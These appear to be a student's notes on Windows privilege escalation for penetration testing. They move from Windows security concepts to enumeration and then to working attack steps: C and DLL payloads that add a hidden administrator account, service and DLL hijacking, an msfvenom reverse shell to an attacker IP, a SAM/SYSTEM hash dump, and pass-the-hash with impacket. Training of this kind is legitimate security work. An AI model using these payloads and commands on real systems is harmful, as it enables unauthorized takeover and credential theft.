Windows Privilege Escalation

Enumerating Windows

Understanding Windows Privileges and Access Control Mechanism

SID: Security Identifier
unique value assigned to each entity that can be authed by windows
users and groups etc

SID for local accounts is gneerated by the Local Security Authoority LSA

SID for domain users are generated on Domain Controller

SID can't be changed and is generated when the user is created

SID string consists of different parts
S-R-X-Y

S is literal: s for string

R is revision and is always set to 1

X determines the id authority, this is the authority that issues the SID, 5  is the most common value for the identifier authority 
NT Authority and is used for local or domain users

Y sub authorities of the id authority, SID consists of one or more sub authorities

domain identifer and relative identifier

S-1-5-21-1336799502-1441772794-948155058-1001

example of local user SID

There are SID that have a RID under 1000: well known SIDs

identify generic and built in groups and users instead of specific groups and users

S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

user authed, windows generates access token that is assigned to user-> token contains info that discribes the security context of a given user

security context = SID of user, SID of groups the user belong, user and group privileges and other information for the scope of the token

when user stats thread, token will be assigned to these obj
primary token: which permission the process have when interacting with another obj and is a copy of the access token of the user

thread can also have impersonation token -> different security context that the process that owns the thread
thread interact with objects on behalf of the impresonation token instead of the primary

Windows enforce Mandatory Integrity Control, which restricts access based on predefined levels

integrity levels is used to control access to securable oobjects -> how much trust windows assigns to applications and objects -> low integrity level can't modifiy high level ones

process and objects inherit the integrity level of the user who creates them

- System integrity – Kernel-mode processes with SYSTEM privileges
- High integrity – Processes with administrative privileges
- Medium integrity – Processes running with standard user privileges
- Low integrity level – Restricted processes, often used for security   [sandboxing], such as web browsers.
- Untrusted – The lowest integrity level, assigned to highly restricted processes that pose potential security risks

we can check integrity levels using Process Explorer

verify user integrity with whoami / groups 

inspect file integrity with icacls

Windows also use User Account Control to restrict unauthed priv esc

UAC: protects the OS by running app and tasks with standard user privileges, even if user launching them is admin

UAC is enforced by issuing 2 access tokens to admin users at logon, first is std user token -> non admin tasks
second is regular admin token -> only actives when elevated privileges are explicitly required

by default everything runs medium

Medium: user cannnot mod system files or registry keys

RID of the first standard user is 1000
access token is generated when a user is created and isn't immutable


Situational Awareness

we should obtain several key information for situational awareness:

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

user enum:
- whoami: username, hostname(client system or server)
- whoami /groups: group of compromised user
- powershell -> Get-LocalUser: other users and groups on the system
- net user also works for other users and groups
- powershell -> Get-LocalGroup: group enumeration
- net localgroup also works for group enumeration
- powershell -> Get-LocalGroupMember "<group name>"

system enum: 
- powershell -> systeminfo: OS, version, architecture

network enum:
- ipconfig /all: list all network interface
- route print: display routing table (vertical movement)
- netstat -ano: 
    -a for all active TCP connection as well as TCP && UDP ports
    -n disable name resolution
    -o show process ID
- Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname: display application that's 32bits
- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname: diplay all 64 bit app
(note that the list might be incomplete, so we'd do well to check Program Files in C and Downloads folder)
removing select displayname to show everything
- Get-Process: get running app
- Get-Process -Name <name> | Select-Object Path, Id :getting the binary path of the running process


Hidden in Plain View

never underestimate the laziness of users when it comes to passwords and sensitive information, poke around for txt on desktops

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
to find keepass db file to crack

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
find if user is lazy and stored their master password in txt ini form in the password manager directory

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
home directory search of commmon text files

Get-ChildItem -Path C:\Users\ `
-Include *.txt,*.pdf,*.xls*,*.doc*,*.ini,*.csv,*.xml,*.json,*.config,*.ps1,*.bat,*.cmd,*.kdbx,*.sqlite,*.db,*.log,*.bak,*.rdp `
-File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
all in one scan 

with access to GUI: we can use:
Runas
run a program as a different user

if target user has Log on as a batch job access right, we can scheduale a task to exe a program

if user has an active session we can use PsExec from Sysinternals

runas /user:<username> cmd
use in powershell run cmd as the user


Information Gold Mine Powershell

default windows only logs a small amount of information on powershell 

we often find powershell logging mechanism enabled on windows clients and servers on enterprise environments

PowerShell Transcription and PowerShell Script Block Logging

Transcription: logging infor is equal to what a person would obtain from looking over the shoulder
stored in transcript files in home directory, a central directory of all users of a machine or network share collecting the files from all config

script block logging: much broader logging of information because it records the full context of the code and command, event also contains the original representation of the event

- Get-History: a list of commands executed in the past

- (Get-PSReadlineOption).HistorySavePath: from PSReadline if the admin does Clear-History 
just repeat the intresting commands and see what happens

to avoid issues use:
evil-winrm -i <ip> -u <username> -p "<password>" 
to connect to WinRM from kali
make sure the escape the ! in passwords with \ for example:
qwertqwertqwert123!! ==> qwertqwertqwert123\!\!

Applications and Services Logs
    → Microsoft
        → Windows
            → PowerShell
                → Operational
Script Block Logging location 4104 event log


Automating Enumeration

winPEAS

install peass

we can copy the thing via:
cp /usr/share/peass/winpeas/winPEASx64.exe .
to home directory
and serve the tool via python

iwr -uri http://<myip>/winPEASx64.exe -Outfile winPEAS.exe
this grabs the tool from kali

using powershell:
.\winPEAS.exe
runs the program

.\Seatbelt.exe -group=all

note that using the tool doesn't replace manuel work complement with above powershell commands just in case



Leveraging Windows Services

Service Binary Hijacking

scenario which fev creates a program that is not seecure during installation, allowing full Read and Write aaccess to all members of the user group

a lower privileged user could replace the program with a malicious one, by starting the service or rebooting the machine we can exe the binary

to get a list of all installed windows services:
GUI: services.msc
- Get-Services
- Get-CimInstance

- Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
finding the win32 service that's running showing name state and location

using either
icacls: can be used in powershell and cmd
- Get-ACL
we can enumerate permission

icacls "C:\xampp\apache\bin\httpd.exe"
example of icacls usage


#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 Password123@ /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

optional to add dave2 into rdp
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 Password123@ /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system("net localgroup \"Remote Desktop Users\" dave2 /add");
  
  return 0;
}

remember to do \!


create a user named dave2 and add user to local Admin group 

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
compiling with mingw32 
--shared to build dll

we serve the exe
move the vulnerable exe using move to home directory using:
move <path from icacls>.exe <name>.exe
move .\<expliot>.exe <path from icacls with original name>.exe

we can use:
net stop <service> 
to try and restart the service

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service name>'}
this checks for the startup type

using
whoami /priv
we can see our privilege

we can issue:
shutdown /r /t 0
for a 0 tick restart

we have a tool to automatically scan for priv esc vector:
PowerUp.ps1

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
copying the tool to home directory to serve to machine

powershell -ep bypass

. .\PowerUp.ps1

Get-ModifiableServiceFile
this overlays powerup with modable services to check for vulnerability

powerup also provides AbuseFunction 
which replace binary and restarts service
a new local user called john with password Password123!

Install-ServiceBinary -Name '<service>'



DLL Hijacking

user often doesn't have permission to replace binaries, need to adapt with more advanced way of abusing service

DLL Dynamic Link Libraries provide functionality to programs or the windows os

windows uses dll to store functionality needed by several components

one method is to overwrite the binary of the dll

however the service or application may not work as expected because actuall DLL function is missing

another method is to hijack the DLL search order
defined by ms and determines what to inspect first when searching for DLL 

by default safe search mode for DLL is enabled

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

A special case is a missing DLL
program functions with limited abilities

We can use Process Monitor to display realtime information of process, thread, file system or registry activity

Process Monitor needs admin privileges, we can just copy the service binary to a local machine

located at C:\tools\Procmon\

create a filter to only include events related to the target service
Filter menu > Filter

Process Name as Column
is as relation
<exename> as Value
Include as Action

use the trashcan clear button to clear current events

CreateFile is responsible for creating files and accessing existing files



#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 Password123@ /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

prvious exe code but for dll, note that previous code is .c this is .cpp

after compiling shove into the search directory if intercept is possible


Unquoted Service Paths

we can use unquoted service paths when we have weite permissions to a service's directory but cannot replace files within

windows service maps to an exe that runs when service startes, of path of the file contains one or more spaces and is not enclosed within quotes, we can use it to priv esc

suppose unquoted binary path:
C:\Program Files\My Program\My Service\service.exe

the program will test:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

note that for every space the program tries to find <word>.exe until moving on

since it's calling all this we can just create a malicious exe and shove it in one of the locations

note that std user don't have c, program files write permission often

more effective way to id spaces in paths and missing quotes is using
WMI command-line utility

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
this is cmd only

Start-Service <service>
Stop-Service <service> 
to test


Abusing Other Windows Components

Scheduled tasks

task scheduler to exe various automated tasks

tasks are defined with triggers

trigger is a condition 

we need to obtain:

1. which user account does this task get exe
2. what triggers are specified for the task
3. what action are exe when one or more triggers are met

1 lets us know if the task can be used as priv esc, as if the task is exe by current user or lower nothing will happen

2 if trigger condition was met in the past, task will not run again in the future and not a viable target

3 tells us how to perform the priv esc

schtasks /query /fo LIST /v (cmd only)
/fo LIST: output as list
/v verbos


Using Exploits

application based vulnerability v windows kernel vulnerability

second case is obviously more advanced

kernel exploits easily crasah a system, RoE may disallow

systeminfo
grab OS version

Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
grab patch version

we can look through Microsoft Security Response Center to locate vulnerabilities


Non-privileged users with assigned privileges such as SelmpersonatePrivilege
which we can use to levelage a token with another security context

pentests:
rare for std::user to have Selmpersonate, but when Internet Information Service is compromised it often has it

IIS runs as LocalService, LocalSystem, NetworkService, ApplicationPoolIdentity

Named pipes are method for local or remote Inter-Process Communication
functionality of two unrealated processes sharing data

named pipe server -> create named pipe to which a named pip client can cnoonect via name

once client connect to named pipe, server can leverage the mentioned privilege to impresonate client after capturing the auth from the connection

to abuse, we find a privileged process and coerce it into connecting to a controlled named pipe

we use

SigmaPotato
uses a variation of potato privilege escalation to coerce NT AUTHORITY|SYSTEM to connect to controlled named pipe

we can use this when we have code exe as user with SelmpersonatePrivilege

wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
this is to download the tool

after transfering the tool
.\SigmaPotato "<command>"

there are other variants of the potato family for us to use

sc qc <servicename> 
to find out who is running the service

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.164 LPORT=2222 -f dll -o EnterpriseServiceOptional.dll
proper windows nc reverse shell

note that if backup privilege is allowed:
reg save HKLM\SAM C:\Users\Public\sam.save
reg save HKLM\SYSTEM C:\Users\Public\system.save

dump and decrypt

impacket-secretsdump -sam sam.save -system system.save LOCAL

like so, and using the hash obtained:

impacket-psexec -hashes :<backhash> administrator@192.168.207.222

this is only smb